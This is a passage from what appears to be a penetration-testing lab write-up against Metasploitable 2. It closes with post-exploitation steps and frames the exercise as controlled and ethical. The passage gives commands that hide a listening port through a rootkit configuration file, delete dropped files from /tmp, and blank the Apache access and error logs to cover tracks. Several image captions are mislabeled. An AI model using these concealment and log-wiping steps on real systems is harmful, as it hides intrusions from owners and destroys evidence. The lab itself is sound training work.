   the victim host. Then check that it will not appear among the list of listening ports.

   ```bash
       echo "5005" > /dev/proc/fuckit/config/lports
       netstat --protocol=inet
   ```

   ![Excuuting Hydra Command](/images/hide_listening.png)

 10. Remove files left in /tmp folder of the victim host
      ```bash
          cd /tmp
          rm fk.tgz
      ```
      ![Excuuting Hydra Command](/images/del_fk.png)

11. Several traces were left in the access and error log of the victim’s web server, especially files: /var/log/apache2/access.log and /var/log/apache2/error.log.
   You check their content using the commands:

   ```bash
          cat /var/log/apache2/access.log
          cat /var/log/apache2/error.log
   ```
   ![Excuuting Hydra Command](/images/access_log.png)
   
   execute the following commands to clear them.

   ```bash
          echo > /var/log/apache2/access.log
          echo > /var/log/apache2/error.log
   ```
   
   Then verify that all records were successfully deleted.

   ![Excuuting Hydra Command](/images/clean_access.png)


---

## 🎉 Conclusion

This lab successfully demonstrated the full cycle of a typical penetration test in a controlled and ethical environment, moving from initial reconnaissance through to persistence and the analysis of track covering. The exercise highlighted critical security vulnerabilities present in legacy systems like Metasploitable 2 and reinforced essential defensive strategies.
  
